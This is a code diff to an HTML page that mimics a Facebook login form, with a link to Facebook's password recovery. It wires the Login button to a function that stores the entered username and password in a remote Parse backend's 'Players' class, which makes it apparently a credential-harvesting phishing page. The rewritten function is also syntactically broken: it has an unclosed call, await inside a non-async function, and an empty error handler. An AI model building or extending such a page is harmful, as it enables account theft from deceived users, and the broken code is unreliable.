@@ -107,7 +107,7 @@ padding: 0;
 <br/><br>
 <input id="password" placeholder='Password' type='text  '/>
 <br/><br/>
-    <button class="btn-login" id="createButton">Login</button> 
+    <button class="btn-login" id="createButton" onClick="createParseUser()">Login</button> 
 <br/>
 <br/>
 <a href='https://facebook.com/recover/initiate/' style='color: #7596c8!important;text-decoration: none;font-size: 15px;' tabindex='0'>Forgot Password?</a> <br>
@@ -148,32 +148,17 @@ Parse.initialize(
   'saiHkSrLOlUvI25pF6DV3nteoL9F1HPZVFlBxKqE' // This is your Javascript key
 );
     // Create a new User
-    async function createParseUser() {
+     function createParseUser() {
       // Creates a new Parse "User" object, which is created by default in your Parse app
-      let userr = new Parse.Players();
-      // Set the input values to the new "User" object
-      userr.set("username", document.getElementById("username").value);
-      userr.set("password", document.getElementById("password").value);
-      try {
-        // Call the save method, which returns the saved object if successful
-        userr = await userr.save();
-        if (userr !== null) {
-          // Notify the success by getting the attributes from the "User" object, by using the get method (the id attribute needs to be accessed directly, though)
-          alert(
-            `New object created with success! ObjectId: ${
-              userr.id
-            }, ${userr.get("username")}`
-          );
-        }
-      } catch (error) {
-        alert(`Error: ${error.message}`);
-      }
+     const myNewObject = new Parse.Object('Players');
+  myNewObject.set('username', document.getElementById('username');
+  myNewObject.set('password', document.getElementById('password'));
+  try {
+    const result = await myNewObject.save();
+    // Access the Parse Object attributes using the .GET method
+    } catch (error) {
     }
-
-    // Add on click listener to call the create parse user function
-    document.getElementById("createButton").addEventListener("click", async function () {
-      createParseUser();
-    });
+    }
   </script>
 </html>
 </html>
